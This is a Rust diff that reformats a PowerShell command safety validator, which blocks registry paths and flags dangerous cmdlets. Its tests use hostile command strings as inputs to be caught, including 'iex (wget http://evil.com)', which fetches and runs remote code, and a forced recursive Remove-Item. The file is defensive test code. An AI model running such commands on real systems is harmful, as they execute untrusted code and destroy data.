@@ -462,8 +462,10 @@ pub fn is_powershell_command(command: &str) -> bool {
     matches!(first, "pwsh" | "powershell" | "powershell.exe" | "pwsh.exe")
         || command.contains("| ") && command.to_lowercase().contains("-object")
         || command.contains("$env:")
-        || command.contains("Get-") || command.contains("Set-")
-        || command.contains("Remove-") || command.contains("Invoke-")
+        || command.contains("Get-")
+        || command.contains("Set-")
+        || command.contains("Remove-")
+        || command.contains("Invoke-")
 }
 
 /// Validate a Windows/PowerShell path for safety.
@@ -486,7 +488,10 @@ pub fn validate_powershell_path(path: &str) -> Result<(), String> {
     }
 
     // Block registry paths
-    if normalized.starts_with("hklm:") || normalized.starts_with("hkcu:") || normalized.starts_with("registry::") {
+    if normalized.starts_with("hklm:")
+        || normalized.starts_with("hkcu:")
+        || normalized.starts_with("registry::")
+    {
         return Err(format!("Registry path access blocked: {path}"));
     }
 
@@ -507,7 +512,9 @@ pub fn is_dangerous_powershell(command: &str) -> bool {
         }
     }
     // Check for -Force flag on destructive operations
-    if lower.contains("-force") && (lower.contains("remove") || lower.contains("del") || lower.contains("clear")) {
+    if lower.contains("-force")
+        && (lower.contains("remove") || lower.contains("del") || lower.contains("clear"))
+    {
         return true;
     }
     false
@@ -529,7 +536,9 @@ pub fn validate_powershell_command(command: &str) -> Result<(), String> {
         if let Some(pos) = command.to_lowercase().find(flag) {
             let after = &command[pos + flag.len()..];
             let path = after.trim().trim_matches('"').trim_matches('\'');
-            let path_end = path.find(|c: char| c.is_whitespace() || c == '"' || c == '\'').unwrap_or(path.len());
+            let path_end = path
+                .find(|c: char| c.is_whitespace() || c == '"' || c == '\'')
+                .unwrap_or(path.len());
             let extracted = &path[..path_end];
             if !extracted.is_empty() {
                 validate_powershell_path(extracted)?;
@@ -765,7 +774,9 @@ mod tests {
 
     #[test]
     fn powershell_dangerous_cmdlets() {
-        assert!(is_dangerous_powershell("Remove-Item -Recurse -Force C:\\temp"));
+        assert!(is_dangerous_powershell(
+            "Remove-Item -Recurse -Force C:\\temp"
+        ));
         assert!(is_dangerous_powershell("Invoke-Expression $cmd"));
         assert!(is_dangerous_powershell("iex (wget http://evil.com)"));
         assert!(is_dangerous_powershell("Stop-Computer"));
@@ -796,8 +807,9 @@ mod tests {
 
     #[test]
     fn powershell_path_in_command() {
-        assert!(validate_powershell_command(
-            "pwsh -c Get-ChildItem -Path \"C:\\Windows\\System32\""
-        ).is_err());
+        assert!(
+            validate_powershell_command("pwsh -c Get-ChildItem -Path \"C:\\Windows\\System32\"")
+                .is_err()
+        );
     }
 }
